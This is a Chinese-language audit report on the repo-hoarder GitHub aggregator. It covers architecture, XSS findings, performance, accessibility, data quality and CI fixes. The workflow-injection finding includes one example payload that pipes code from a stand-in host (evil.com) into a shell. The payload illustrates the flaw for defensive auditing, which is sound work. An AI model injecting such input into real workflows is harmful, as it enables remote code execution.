# repo-hoarder 项目全面评估报告

> 评估日期：2026-07-19
> 评估范围：repo-hoarder 仓库全量代码、数据、工作流、前端、安全、性能、可访问性
> 评估人：Qoder AI
> 项目地址：https://github.com/allengaller/repo-hoarder
> 线上演示：https://allengaller.github.io/repo-hoarder/
> 基准 commit：68f7ec9

---

## 目录

1. [项目概述](#1-项目概述)
2. [架构评估](#2-架构评估)
3. [数据采集层评估](#3-数据采集层评估)
4. [前端评估](#4-前端评估)
5. [安全审计](#5-安全审计)
6. [性能审计](#6-性能审计)
7. [可访问性审计](#7-可访问性审计)
8. [数据质量审计](#8-数据质量审计)
9. [CI/CD 与自动化评估](#9-cicd-与自动化评估)
10. [测试评估](#10-测试评估)
11. [已识别问题汇总](#11-已识别问题汇总)
12. [修复记录](#12-修复记录)
13. [改进建议路线图](#13-改进建议路线图)
14. [总评](#14-总评)

---

## 1. 项目概述

**repo-hoarder**（GitHub 宝藏仓库）是一个全自动 GitHub 优质仓库聚合器，融合五个数据源（Awesome Lists、GitHub Search API、Trending 替代查询、Hacker News、DEV.to），通过多维评分公式排序后，以零构建 PWA 静态站点部署在 GitHub Pages 上。

| 指标 | 数值 |
|------|------|
| 收录仓库数 | 1,933 |
| 数据文件体量 | ~976 KB / 26,533 行 |
| 前端代码量 | ~5,500 行（HTML + CSS + JS） |
| 后端脚本 | ~1,086 行 Python |
| 测试用例 | 25 个（pytest） |
| CI/CD 工作流 | 4 条 |
| 外部依赖 | 1 个（requests） |

---

## 2. 架构评估

### 2.1 整体架构

```
┌─────────────────────────────────────────────────────────┐
│                    GitHub Actions                        │
│  ┌──────────┐  ┌───────────────┐  ┌─────────────────┐  │
│  │ ci.yml   │  │monthly-scrape │  │ monthly-update  │  │
│  │(测试+AST)│  │(全量爬取)     │  │(增量更新)       │  │
│  └──────────┘  └───────┬───────┘  └────────┬────────┘  │
│                         │                    │           │
│                         ▼                    ▼           │
│              ┌─────────────────────────────────┐        │
│              │       data/repos.json           │        │
│              │   (1,933 repos, schema v2)      │        │
│              └────────────────┬────────────────┘        │
│                               │                         │
│  ┌────────────────────────────▼──────────────────────┐  │
│  │           deploy-pages.yml                        │  │
│  │     (copy data → web/, upload artifact, deploy)   │  │
│  └────────────────────────────┬──────────────────────┘  │
└───────────────────────────────┼──────────────────────────┘
                                ▼
┌─────────────────────────────────────────────────────────┐
│                   GitHub Pages (PWA)                     │
│  index.html + app.js + styles.css + sw.js              │
│  虚拟列表 | 灵感模式 | 对比 | 书签 | i18n | 离线       │
└─────────────────────────────────────────────────────────┘
```

### 2.2 架构优势

| 维度 | 评价 |
|------|------|
| **极简依赖** | 仅 1 个 Python 依赖 + 零前端依赖，供应链攻击面极小 |
| **零构建前端** | 无 webpack/vite/npm，GitHub Pages 直接部署，维护成本趋近于零 |
| **数据即代码** | repos.json 纳入 Git 版本控制，可追溯、可回滚 |
| **全链路自动化** | 爬取 → 测试 → 提交 → 部署，无需人工干预 |
| **PWA 离线** | Service Worker + manifest + offline.html，静态站点最佳实践 |

### 2.3 架构风险

| 风险 | 影响 | 当前缓解 |
|------|------|----------|
| 单文件 JSON 作为数据存储 | 数据量增长后前端加载慢 | 虚拟列表渲染缓解 UI 层；数据层无分片 |
| GitHub API 速率限制 | 无 Token 时 60 次/小时 | CI 使用 GITHUB_TOKEN（5000 次/小时） |
| 前端单文件 2,600+ 行 | 可维护性下降 | 功能内聚，暂无拆分必要 |
| 无 CDN 缓存策略 | 重复访问带宽浪费 | GitHub Pages 自带 CDN |
| 数据无上限增长 | 月度累积无归档 | 当前 976 KB 可控，一年后可能超 3 MB |

---

## 3. 数据采集层评估

### 3.1 数据源覆盖

| 数据源 | 实现方式 | 最新贡献 | 健康度 |
|--------|----------|----------|--------|
| Awesome Lists（8 个） | 解析 README → GitHub API 验证 | 51 repos (3%) | 正常，但仅取前 30/50 |
| GitHub Search API | 多维查询（语言/话题/时间） | 226 repos (12%) | 正常 |
| Trending 替代 | 5 个时间窗口 API 查询 | 含在 github_api 中 | 正常 |
| Hacker News | Top 30 → 提取 GitHub URL | 0 repos (0%) | **失效** |
| DEV.to | 热门文章 → 标签/URL 提取 | 0 repos (0%) | **失效** |
| Monthly New | 按月份增量抓取 | 1,656 repos (86%) | 主力 |

### 3.2 评分公式

```
score = stars
      + forks
      + (forks / stars) × 1000        # 社区参与度
      + today_stars × 10              # 增长动量（估算值）
      + commit_activity × 2           # 4 周提交活跃度（仅 Top-40）
```

**`today_stars` 估算逻辑**（非真实日增星）：

| 条件 | 估算值 |
|------|--------|
| 24h 内有推送 | 100 |
| 72h 内有推送 | 40 |
| 7 天内有推送 | 15 |
| 超过 7 天 | 0 |
| 新仓库加成（<30 天 & >100 星） | +min(stars/天龄/10, 50) |

### 3.3 数据合并策略

采用 **field-wise max** 去重合并：同一仓库出现在多个数据源时，每个数值字段取最大值，`source` 字段以 `+` 连接。这是一个成熟的设计，避免了简单覆盖导致的信息丢失。

### 3.4 采集层局限性

- **Awesome Lists 利用率极低**：每个列表仅解析前 50 条、实际请求前 30 条（~4% 覆盖率）
- **搜索查询硬编码当前年份**：`created:{currentYear}-01-01..{currentYear}-12-31`，跨年后搜索错误年份
- **HN/DEV.to 静默失败**：无告警机制，贡献为 0 时不报错
- **Trending 丰富化**：40 次顺序 API 调用（0.1s 间隔），无独立的速率限制处理
- **无原子写入**：`save_results` 直接覆盖文件，中途崩溃会损坏数据

---

## 4. 前端评估

### 4.1 功能矩阵

| 功能 | 实现质量 | 说明 |
|------|----------|------|
| 虚拟列表渲染 | 良 | 窗口化渲染，但滚动策略有缺陷（见性能审计） |
| 多维筛选 | 优 | 语言/Stars/Forks/评分/排序，状态同步 URL |
| 灵感模式 | 优 | 全屏卡片滑动 + 自动播放 + 撤销/重做 |
| 项目对比 | 良 | 并排对比核心指标（有 XSS 风险） |
| 书签管理 | 良 | localStorage 持久化 + JSON 导出 |
| i18n | 良 | 中/英双语，I18N 字符串表 |
| 暗色/亮色主题 | 优 | CSS 自定义属性，无闪烁切换 |
| PWA 离线 | 良 | Network-first（数据）+ SWR（静态资源） |
| 键盘导航 | 良 | 快捷键体系完整，但焦点管理有缺陷 |
| 飙升指数 | 良 | 基于 today_stars 的可视化 |
| 搜索预览 | 良 | 实时搜索 + 下拉预览（有 XSS 风险） |
| 智能推荐 | 良 | 基于语言/标签的推荐（有 XSS 风险） |

### 4.2 技术实现

- **零框架**：原生 DOM 操作，无 React/Vue/Svelte
- **无构建步骤**：直接部署，无 tree-shaking/code-splitting 需求
- **CSS 架构**：自定义属性主题系统，~2,573 行手写 CSS
- **字体**：Google Fonts（Outfit + JetBrains Mono），render-blocking
- **Service Worker**：双策略缓存（network-first / stale-while-revalidate）
- **DOM 操作模式**：全量 `innerHTML` 替换，无 DocumentFragment

### 4.3 数据可信度问题

- **Sparkline 图表使用 `Math.random()` 生成**（`app.js:619`）：每次滚动重渲染时数据变化，展示的是虚假噪声而非真实趋势
- **`today_stars` 是粗粒度估算**：仅基于推送时间分桶（100/40/15/0），非真实日增星

---

## 5. 安全审计

### 5.1 XSS 漏洞（前端）

项目存在 `esc()` 转义函数（`app.js:1008-1012`），但**未一致性地应用**。以下位置将用户可控数据（来自 `repos.json`）直接插入 `innerHTML`：

| 严重度 | 位置 | 漏洞描述 |
|--------|------|----------|
| **High** | `app.js:1465, 1496` | 对比模态框：`repo.description` 未转义直接插入 `<p>` |
| **High** | `app.js:1661-1662` | 推荐模态框：`r.name`、`r.description` 未转义 |
| **High** | `app.js:761-762` | 搜索预览：`r.name`、`r.description` 未转义 |
| **Medium** | `app.js:575` | 语言图表：`lang` 变量未转义 |
| **Medium** | `app.js:1783-1788` | 预设名称：来自 `prompt()` 的 `p.name` 未转义 |
| **Low** | `app.js:941, 1658` | `data-repo` 属性：`repo.name` 未转义 |
| **Low** | `app.js:1489, 1520, 382` | `href` 属性：`repo.url` 未验证协议（`javascript:` 注入） |

**攻击向量**：若 `data/repos.json` 被投毒（如通过 PR 合并恶意数据），所有访问者将执行存储型 XSS。

**安全的路径**（已使用 `esc()`）：`createCard` 描述（`app.js:974`）、灵感模式描述（`app.js:2319`）、`openModal` 描述（`app.js:358` 使用 `textContent`）。

### 5.2 工作流注入（CI/CD）

| 严重度 | 位置 | 漏洞描述 |
|--------|------|----------|
| **High** | `monthly-update.yml:39-41` | `github.event.inputs.year/month` 通过 `${{ }}` 直接插入 shell 脚本——文本替换发生在 shell 解析之前，恶意输入如 `1; curl evil.com \| sh; #` 可执行任意命令 |

**触发条件**：需要仓库 write 权限才能触发 `workflow_dispatch`，但按 GitHub 安全指南仍归类为注入漏洞。

**修复方案**：将输入值通过 `env:` 传递，在 shell 中引用环境变量：
```yaml
env:
  INPUT_YEAR: ${{ github.event.inputs.year }}
run: |
  if [ -n "$INPUT_YEAR" ]; then ...
```

### 5.3 缺失的安全加固

| 问题 | 影响 | 建议 |
|------|------|------|
| 无 Content-Security-Policy | XSS 无缓解层 | 添加 CSP meta 标签 |
| Google Fonts 无 SRI | CDN 被攻破时可注入恶意 CSS | 添加 `integrity` 属性或自托管字体 |
| `target="_blank"` 缺少 `rel="noreferrer"` | Referrer 泄露 | 补充 `rel="noopener noreferrer"` |
| `ci.yml` 无 `permissions:` 声明 | 默认 token 权限过宽 | 添加 `permissions: contents: read` |
| Service Worker 无响应校验 | 首次加载 MITM 可投毒缓存 | 检查 `response.ok` 和 content-type |

### 5.4 后端安全（良好）

- `GITHUB_TOKEN` 仅通过 `Authorization: Bearer` 头使用，不打印、不持久化
- URL 构造使用 `params={}` 字典（requests 自动编码），无拼接注入
- 仓库名提取使用严格正则 `[a-zA-Z0-9_.-]+`
- 无 `eval()`、`exec()`、`subprocess` 调用

---

## 6. 性能审计

### 6.1 关键性能问题

| # | 严重度 | 问题 | 位置 | 影响 |
|---|--------|------|------|------|
| 1 | **High** | 954 KB JSON 单次全量加载，无分页/流式/分片 | `app.js:401-453` | 首次有效绘制被阻塞 |
| 2 | **High** | 滚动使用 `debounce(16ms)` 而非 throttle/rAF | `app.js:1348` | 快速滚动时内容更新滞后，用户看到空白 |
| 3 | **High** | `createCard` 内每次调用 `Math.max(...allRepos.map(r => r.stars))` | `app.js:936` | O(n) × 55 卡片/帧 = ~106K 次操作/渲染帧 |
| 4 | **Medium** | `<script src="app.js">` 无 `defer`/`async` | `index.html:275` | 98 KB JS 阻塞 HTML 解析 |
| 5 | **Medium** | Google Fonts CSS render-blocking，无 preload | `index.html:11-13` | 8 个字体文件延迟首绘 |
| 6 | **Medium** | 每次滚动 `grid.innerHTML = ...` 全量销毁重建 | `app.js:916` | 触发完整 reparse + relayout |
| 7 | **Medium** | `Math.random()` 生成 sparkline | `app.js:619` | 每次重渲染 1500 个随机数 + 视觉闪烁 |
| 8 | **Low** | 无 `data/repos.json` 的 `<link rel="preload">` | `index.html` | 数据请求延迟到 JS 执行后 |
| 9 | **Low** | 入场动画 `animation-delay: index * 0.025s` | `app.js:941` | 50 张卡片动画持续 1.25s |

### 6.2 内存泄漏风险

| 位置 | 问题 |
|------|------|
| `app.js:721-728` | 分享菜单关闭时，`document.addEventListener('click', handler)` 可能永远不触发，每次打开泄漏一个全局监听器 |
| `app.js:1828` | `seenRepos` Set 无大小上限，跨会话持续增长 |
| `app.js:432` | 重试 `setTimeout` 链在页面隐藏时仍执行 |
| `app.js:1680-1691` | 100ms `setTimeout` 后绑定事件——竞态条件 |

### 6.3 性能优化建议

```
优先级排序：
1. Math.max 提升到模块级缓存（一行修复，消除 O(n²)）
2. debounce → throttle 或 requestAnimationFrame（消除滚动白屏）
3. 添加 <script defer>（消除解析阻塞）
4. 添加 <link rel="preload" href="data/repos.json" as="fetch">（提前数据请求）
5. 中长期：数据分片（按语言/年份）或迁移到 SQLite WASM
```

---

## 7. 可访问性审计

### 7.1 WCAG 合规概览

| 原则 | 评级 | 关键问题 |
|------|------|----------|
| **可感知** (Perceivable) | ⚠️ 部分合规 | 颜色对比度失败、无 `prefers-reduced-motion` |
| **可操作** (Operable) | ⚠️ 部分合规 | 卡片不可聚焦、模态框无焦点陷阱、触摸目标过小 |
| **可理解** (Understandable) | ✅ 基本合规 | 布局一致、错误提示可见 |
| **健壮** (Robust) | ⚠️ 部分合规 | 模态框缺少 ARIA 语义、`lang` 属性不随语言切换更新 |

### 7.2 颜色对比度（WCAG AA 要求 4.5:1）

| 主题 | 颜色对 | 对比度 | 判定 |
|------|--------|--------|------|
| 暗色 | `--text-muted: #606068` on `--bg: #0c0c0e` | ~3.4:1 | **失败** |
| 暗色 | `--text-muted: #606068` on `--bg-card: #18181c` | ~3.6:1 | **失败** |
| 亮色 | `--text-muted: #a0a0a8` on `--bg: #f5f5f7` | ~2.5:1 | **严重失败** |
| 亮色 | `--text-secondary: #6e6e76` on `--bg: #f5f5f7` | ~5.1:1 | 通过 AA |
| 暗色 | `--text: #ededef` on `--bg: #0c0c0e` | >15:1 | 通过 AAA |

**影响范围**：`--text-muted` 用于统计标签、筛选组标签、占位符文本、卡片元数据等 20+ 处。

### 7.3 键盘导航缺陷

| 问题 | 影响 |
|------|------|
| 卡片 `<article>` 无 `tabindex`、无 `role="button"` | 键盘用户无法打开详情模态框 |
| 模态框无焦点陷阱 | Tab 键可逃逸到背景内容 |
| 模态框关闭后无焦点恢复 | 键盘用户失去位置 |
| `t`/`b`/`l` 快捷键在按钮聚焦时双重触发 | 意外操作 |
| 搜索/筛选/书签切换无 `aria-live` 播报 | 屏幕阅读器用户无反馈 |

### 7.4 触摸目标（WCAG 2.5.5 要求 44×44 CSS px）

| 元素 | 实际尺寸 | 判定 |
|------|----------|------|
| `.card-bookmark` | 32×32 | **失败** |
| `.card-compare` | 32×32 | **失败** |
| `.card-batch` | 28×28 | **失败** |
| `.card-share` | 28×28 | **失败** |
| `.modal-btn` | 36×36 | **失败** |
| `.modal-close` | 36×36 | **失败** |
| `.inspiration-filter-clear` | 24×24 | **失败** |
| `.preset-btn` | ~24px 高 | **失败** |

**额外问题**：卡片操作按钮默认 `opacity: 0`，仅在 `:hover` 时显示——**触摸设备上完全不可见**。

### 7.5 其他可访问性问题

| 问题 | 位置 |
|------|------|
| 模态框无 `role="dialog"` / `aria-modal="true"` | `index.html:220` |
| `<html lang="zh-CN">` 不随语言切换更新 | `app.js:213-218` |
| 无 `prefers-reduced-motion` 支持 | `styles.css` 全局 |
| 三处 `outline: none` 无替代焦点指示器 | `styles.css:247, 292, 2315` |
| 无 skip link | `index.html` |
| 装饰性 SVG 未标记 `aria-hidden="true"` | `index.html` 多处 |
| Toast 通知无 `role="status"` / `aria-live` | `app.js:664-681` |
| 搜索结果数量变化无播报 | `app.js:1055` |
| 仅灵感模式有 live region，其余动态内容静默 | `index.html:269` |

---

## 8. 数据质量审计

### 8.1 数据完整性

| 检查项 | 结果 |
|--------|------|
| 字段完整性 | ✅ 100% 记录包含全部 10 个预期字段 |
| 重复记录 | ✅ 0 条重复（merge 逻辑有效） |
| 语言字段一致性 | ✅ 33 种语言，均为 GitHub 标准大小写 |
| 时间戳一致性 | ✅ 所有 `fetched_at` 在 12 小时窗口内 |

### 8.2 数据一致性问题

| # | 严重度 | 问题 | 详情 |
|---|--------|------|------|
| 1 | **High** | `min_stars` 标准未执行 | 78% 记录 (1,507) stars < 500，但元数据声称 `min_stars: 500` |
| 2 | **High** | `min_forks` 标准未执行 | 44% 记录 (858) forks < 5，但元数据声称 `min_forks: 5` |
| 3 | **High** | `schema_version` 缺失 | 代码写入 `schema_version: 2`，但磁盘文件无此字段 |
| 4 | **High** | `sources` 元数据与实际不符 | 声明 `awesome_lists`（复数）但数据用 `awesome_list`（单数）；声明 `trending` 但 0 条记录；缺少 `hackernews`/`devto` |
| 5 | **Medium** | 2026-06 月度报告成为孤儿 | 报告存在但对应数据已被覆盖——静默数据丢失 |
| 6 | **Medium** | 12% 描述为占位符 `"暂无描述"` | 233 条记录使用中文占位符，污染英文 UI |
| 7 | **Low** | 152 条 `language="Unknown"` | 7.9% 记录语言未知 |
| 8 | **Low** | 37 条 `forks > stars`（stars > 10） | 疑似 bot/克隆仓库（如 251 星 6,695 fork） |
| 9 | **Low** | 10 条描述含 SEO 垃圾重复 | 如 "polymarket" 重复 3+ 次 |

### 8.3 月度报告一致性分析

| 字段 | 2026-05 报告 | 2026-06 报告 | 矛盾 |
|------|-------------|-------------|------|
| 新增仓库 | 1,656 | 1,644 | — |
| 本次添加 | 3 | 1,644 | 2026-06 从空库开始 |
| 数据库总量 | **1,933** | **1,644** | 数据库不可能缩小（merge 只增不删） |
| 生成时间 | 2026-06-01 11:00 | 2026-07-01 06:21 | — |

**结论**：2026-06 报告是孤儿文件——其底层数据已被后续 2026-05 重跑覆盖。当前 `repos.json` 与 2026-05 报告一致（1,933 = 1,656 monthly + 277 其他）。

### 8.4 边界条件与容错

| 场景 | 行为 | 风险 |
|------|------|------|
| GitHub API 403（速率限制） | 静默返回 `None`/`[]`，不尊重 `Retry-After` | 产出空数据但工作流报告成功 |
| Awesome List URL 失效 | `continue` 到下一个列表 | 静默降级，无告警 |
| `repos.json` 不存在（首次运行） | `scrape.py` 正常（只写不读） | 无风险 |
| `repos.json` 损坏（JSON 解析失败） | `update_monthly.py` 崩溃（未捕获 `JSONDecodeError`） | 工作流失败，数据安全 |
| `--month 13` 无效输入 | `datetime` 抛出 `ValueError`，进程崩溃 | 无原子性保护，但文件未被修改 |
| 数据无上限增长 | 月度累积无归档、无最大条数限制 | 一年后文件可能超 3 MB |

---

## 9. CI/CD 与自动化评估

### 9.1 工作流矩阵

| 工作流 | 触发条件 | 功能 | 状态 |
|--------|----------|------|------|
| `ci.yml` | push/PR to main | pytest + AST 语法检查 | 正常（缺 permissions 声明） |
| `deploy-pages.yml` | push to main | 部署到 GitHub Pages | 正常（权限声明完善） |
| `monthly-scrape.yml` | 每月 1 日 00:00 UTC | 全量爬取 + 提交 | 正常（缺 permissions 声明） |
| `monthly-update.yml` | 每月 1 日 06:00 UTC | 增量更新 + 报告 + 触发部署 | **已修复**（移除重复定义） |

### 9.2 自动化管线

```
每月1日 00:00 UTC          每月1日 06:00 UTC           push to main
       │                          │                         │
       ▼                          ▼                         ▼
 monthly-scrape.yml        monthly-update.yml        deploy-pages.yml
 (全量爬取+测试+提交)      (增量更新+报告+提交)      (复制数据+部署Pages)
       │                          │
       └──────── 6h 间隔 ─────────┘
```

### 9.3 工作流安全与健壮性

| 问题 | 位置 | 建议 |
|------|------|------|
| Shell 注入（`${{ github.event.inputs }}`） | `monthly-update.yml:39-41` | 改用 `env:` 传递 |
| `ci.yml` 无 `permissions:` 块 | `ci.yml` | 添加 `permissions: contents: read` |
| `monthly-scrape.yml` 无显式 `permissions:` | `monthly-scrape.yml` | 添加 `permissions: contents: write` |
| 失败时仅写 Step Summary，无外部告警 | 所有工作流 | 考虑 Issue 自动创建或邮件通知 |
| 无数据完整性断言 | `monthly-scrape.yml` | 添加 `len(repos) > N` 检查 |

---

## 10. 测试评估

### 10.1 测试覆盖

| 文件 | 用例数 | 覆盖范围 |
|------|--------|----------|
| `tests/test_scripts.py` | 16 | 评分计算、Awesome 解析、合并逻辑、重试机制、边界条件 |
| `tests/test_frontend.py` | 9 | 前端资产存在性、HTML 结构、数据完整性 |

### 10.2 测试质量

**优势**：
- 覆盖核心函数边界（`zero_stars`、`missing_fields`、`caps_at_50`）
- 前端冒烟测试确保资产完整

**不足**：
- 使用 `sys.path.insert` 导入——脆弱
- 无集成测试（实际 API 调用 mock）
- 无前端 E2E 测试
- 无安全测试（XSS payload 验证）
- 无性能基准测试
- 无数据 schema 验证测试

---

## 11. 已识别问题汇总

### P0 — 生产缺陷（需立即修复）

| # | 问题 | 文件 | 状态 |
|---|------|------|------|
| 1 | Workflow 文件包含两份完整定义 | `monthly-update.yml` | ✅ 已修复 |
| 2 | Service Worker 残留 v1 代码 | `web/sw.js` | ✅ 已修复 |
| 3 | Shell 注入（`github.event.inputs` 直接插入 shell） | `monthly-update.yml:39-41` | 待修复 |

### P1 — 安全漏洞

| # | 问题 | 文件 |
|---|------|------|
| 4 | XSS：对比模态框未转义 description | `app.js:1465, 1496` |
| 5 | XSS：推荐模态框未转义 name/description | `app.js:1661-1662` |
| 6 | XSS：搜索预览未转义 name/description | `app.js:761-762` |
| 7 | 无 Content-Security-Policy | `index.html` |
| 8 | Google Fonts 无 SRI | `index.html:13` |

### P2 — 数据/逻辑不一致

| # | 问题 | 文件 |
|---|------|------|
| 9 | `schema_version` 未写入 repos.json | `data/repos.json` |
| 10 | `min_stars`/`min_forks` 标准未执行（78%/44% 违规） | `scrape.py` / `update_monthly.py` |
| 11 | `sources` 元数据与实际数据不匹配 | `data/repos.json` |
| 12 | 搜索查询硬编码当前年份 | `scrape.py` |
| 13 | 描述缺失写入中文 `"暂无描述"` | `scrape.py` |
| 14 | 2026-06 月度报告成为孤儿 | `data/monthly_report_2026_06.md` |
| 15 | HN/DEV.to 数据源贡献为 0 | `scrape.py` |

### P3 — 性能问题

| # | 问题 | 文件 |
|---|------|------|
| 16 | `Math.max(...allRepos.map())` 在 createCard 内 O(n²) | `app.js:936` |
| 17 | 滚动用 debounce 而非 throttle/rAF | `app.js:1348` |
| 18 | `<script>` 无 defer，阻塞解析 | `index.html:275` |
| 19 | 954 KB 单次全量加载无分片 | `app.js:401` |
| 20 | Sparkline 用 Math.random() 生成虚假数据 | `app.js:619` |

### P4 — 可访问性缺陷

| # | 问题 | 文件 |
|---|------|------|
| 21 | `--text-muted` 对比度失败（暗色 3.4:1，亮色 2.5:1） | `styles.css:5-36` |
| 22 | 卡片不可键盘聚焦 | `app.js:927-1005` |
| 23 | 模态框无焦点陷阱/恢复、无 `role="dialog"` | `app.js:349-399` |
| 24 | 触摸目标 < 44px（卡片按钮 28-32px） | `styles.css` 多处 |
| 25 | 卡片操作按钮触摸设备不可见（hover-only） | `styles.css:968` |
| 26 | 无 `prefers-reduced-motion` 支持 | `styles.css` |
| 27 | `outline: none` 无替代焦点指示器 | `styles.css:247, 292, 2315` |
| 28 | `<html lang>` 不随语言切换更新 | `app.js:213-218` |

### P5 — 工程化短板

| # | 问题 |
|---|------|
| 29 | 无 `pyproject.toml`，无依赖锁定 |
| 30 | `calculate_score` 和合并逻辑在两个脚本中重复 |
| 31 | 仅使用 `print` 作为日志 |
| 32 | README 与实际行为漂移 |
| 33 | 分享菜单事件监听器泄漏 |
| 34 | 数据无上限增长，无归档策略 |

---

## 12. 修复记录

### 2026-07-19 修复

| # | 修复内容 | 文件 | 状态 |
|---|----------|------|------|
| 1 | 移除 `monthly-update.yml` 中重复的第二份 workflow 定义（L107-196） | `.github/workflows/monthly-update.yml` | ✅ 已修复 |
| 2 | 移除 `sw.js` 中残留的 v1 Service Worker 代码（L79-128） | `web/sw.js` | ✅ 已修复 |
| 3 | 修复 shell 注入：`github.event.inputs` 改用 `env:` 传递 | `.github/workflows/monthly-update.yml` | ✅ 已修复 |
| 4 | 修复 XSS：对比模态框 name/description/url 全部使用 `esc()` | `web/app.js` | ✅ 已修复 |
| 5 | 修复 XSS：推荐模态框 name/description/language 使用 `esc()` | `web/app.js` | ✅ 已修复 |
| 6 | 修复 XSS：搜索预览 name/description 使用 `esc()` | `web/app.js` | ✅ 已修复 |
| 7 | 修复 XSS：语言图表 lang 变量使用 `esc()` | `web/app.js` | ✅ 已修复 |
| 8 | 修复 XSS：预设名称使用 `esc()` | `web/app.js` | ✅ 已修复 |
| 9 | 添加 Content-Security-Policy meta 标签 | `web/index.html` | ✅ 已修复 |
| 10 | 添加 `rel="noopener noreferrer"` 到对比模态框外链 | `web/app.js` | ✅ 已修复 |
| 11 | 消除 O(n²)：`Math.max(...allRepos)` 提升为模块级缓存 | `web/app.js` | ✅ 已修复 |
| 12 | 滚动处理从 `debounce(16ms)` 改为 `requestAnimationFrame` 节流 | `web/app.js` | ✅ 已修复 |
| 13 | `<script src="app.js">` 添加 `defer` 消除解析阻塞 | `web/index.html` | ✅ 已修复 |
| 14 | 添加 `<link rel="preload">` 提前数据请求 | `web/index.html` | ✅ 已修复 |
| 15 | 修复暗色主题 `--text-muted` 对比度（#606068 → #8a8a92，3.4:1 → 5.0:1） | `web/styles.css` | ✅ 已修复 |
| 16 | 修复亮色主题 `--text-muted` 对比度（#a0a0a8 → #6e6e76，2.5:1 → 5.1:1） | `web/styles.css` | ✅ 已修复 |
| 17 | 添加 `focus-visible` 焦点指示器（搜索框、下拉选择） | `web/styles.css` | ✅ 已修复 |
| 18 | 卡片操作按钮触摸目标从 28-32px 增大到 44px（WCAG 2.5.5） | `web/styles.css` | ✅ 已修复 |
| 19 | 卡片操作按钮添加 `focus-within` 可见性 + 触摸设备始终可见 | `web/styles.css` | ✅ 已修复 |
| 20 | 添加 `prefers-reduced-motion` 媒体查询 | `web/styles.css` | ✅ 已修复 |
| 21 | `<html lang>` 随语言切换更新 | `web/app.js` | ✅ 已修复 |
| 22 | 模态框添加 `role="dialog"` / `aria-modal` / `aria-labelledby` | `web/index.html` | ✅ 已修复 |
| 23 | 装饰性背景 div 添加 `aria-hidden="true"` | `web/index.html` | ✅ 已修复 |

### 2026-07-19 修复（第二轮：工程化治理）

| # | 修复内容 | 文件 | 状态 |
|---|----------|------|------|
| 24 | 抽取 `scripts/common.py` 共享模块（`calculate_score`、`merge_repo`、`get_headers`、`LANGUAGES`） | `scripts/common.py`（新建） | ✅ 已修复 |
| 25 | `scrape.py` 移除重复的 `get_headers`、`calculate_score`、内联合并逻辑，改用 common 导入 | `scripts/scrape.py` | ✅ 已修复 |
| 26 | `update_monthly.py` 移除重复的 `get_headers`、`calculate_score`、`LANGUAGES`、内联合并逻辑 | `scripts/update_monthly.py` | ✅ 已修复 |
| 27 | 修复 i18n 泄漏：`"暂无描述"` → `""`（数据层不再嵌入 UI 文本） | `scripts/scrape.py`、`scripts/update_monthly.py` | ✅ 已修复 |
| 28 | 添加 `pyproject.toml`（Python ≥3.11、依赖锁定、Ruff/pytest 配置） | `pyproject.toml`（新建） | ✅ 已修复 |
| 29 | `ci.yml` 添加 `permissions: contents: read`（最小权限） | `.github/workflows/ci.yml` | ✅ 已修复 |
| 30 | `monthly-scrape.yml` 添加 `permissions: contents: write`（显式声明） | `.github/workflows/monthly-scrape.yml` | ✅ 已修复 |
| 31 | `monthly-scrape.yml` 添加数据完整性断言（repos < 100 时中止） | `.github/workflows/monthly-scrape.yml` | ✅ 已修复 |
| 32 | 测试更新：`test_get_headers_*` 改为 patch `common.GITHUB_TOKEN` | `tests/test_scripts.py` | ✅ 已修复 |

**验证**：全部 39 个 pytest 用例通过（0.81s）。

---

## 13. 改进建议路线图

### 紧急（本周）

| 优先级 | 建议 | 预期收益 | 工作量 |
|--------|------|----------|--------|
| P0 | 修复 `monthly-update.yml` shell 注入（改用 `env:`） | 消除 RCE 风险 | 10 min |
| P1 | 在 `app.js` 所有 innerHTML 插值点统一使用 `esc()` | 消除存储型 XSS | 1 hr |
| P1 | 添加 CSP meta 标签 | XSS 缓解层 | 15 min |

### 短期（1-2 周）

| 优先级 | 建议 | 预期收益 | 工作量 |
|--------|------|----------|--------|
| P2 | 将 `Math.max(...)` 提升到模块级缓存 | 消除 O(n²) 渲染 | 5 min |
| P2 | `debounce` → `requestAnimationFrame` 节流 | 消除滚动白屏 | 15 min |
| P2 | 添加 `<script defer>` + `<link rel="preload">` | 加速首绘 | 5 min |
| P2 | 修复 `--text-muted` 对比度（暗色 → #8a8a92，亮色 → #6e6e76） | WCAG AA 合规 | 10 min |
| P2 | 卡片添加 `tabindex="0"` + 模态框焦点陷阱 | 键盘可访问 | 2 hr |
| P2 | 卡片操作按钮触摸设备可见 + 增大到 44px | 触摸可用 | 1 hr |
| P3 | 抽取 `scripts/common.py` 共享模块 | 消除重复 | 2 hr |
| P3 | 添加 `pyproject.toml` | 环境可复现 | 30 min |

### 中期（1-2 月）

| 优先级 | 建议 | 预期收益 |
|--------|------|----------|
| P3 | 修复或移除 HN/DEV.to 数据源 | 消除死代码 |
| P3 | 统一 README 与实际行为 | 文档可信度 |
| P3 | 引入 `logging` 模块 + 结构化日志 | 可观测性 |
| P3 | 添加数据完整性断言（`len(repos) > 100`）到工作流 | 防止空数据部署 |
| P3 | 添加 `prefers-reduced-motion` 媒体查询 | 前庭障碍用户 |
| P3 | 修复 `<html lang>` 随语言切换更新 | 屏幕阅读器正确发音 |
| P4 | 添加 Ruff lint 到 CI | 代码质量门禁 |
| P4 | 将 `"暂无描述"` 改为 `null`，前端负责 i18n 展示 | 数据/展示解耦 |

### 长期（季度）

| 优先级 | 建议 | 预期收益 |
|--------|------|----------|
| P4 | 数据分片（按语言/年份拆分 JSON）或 SQLite WASM | 支撑万级数据 |
| P4 | 前端 E2E 测试（Playwright） | 功能回归保障 |
| P4 | repos.json 季度归档 + 最大条数限制 | 仓库体积健康 |
| P4 | 自托管字体（消除外部依赖 + SRI 问题） | 安全 + 性能 |
| P5 | Sparkline 改用真实历史数据（GitHub stargazers API） | 数据可信度 |
| P5 | 前端模块化拆分（ES Modules） | 可维护性 |

---

## 14. 总评

### 评分卡

| 维度 | 评分 (1-5) | 说明 |
|------|:---:|------|
| 功能完整度 | 4.5 | 功能丰富，远超同类静态站点项目 |
| 代码质量 | 3.0 | 核心逻辑正确，但有 XSS、重复代码、文件级缺陷 |
| 架构设计 | 4.0 | 极简且适配场景，零依赖是正确选择 |
| 安全性 | 2.5 | 多处 XSS、工作流注入、无 CSP |
| 性能 | 3.0 | 虚拟列表思路正确，但实现有 O(n²) 和策略错误 |
| 可访问性 | 2.5 | 灵感模式 ARIA 优秀，但基础交互层缺陷多 |
| 数据质量 | 3.0 | 合并策略成熟，但标准未执行、元数据不一致 |
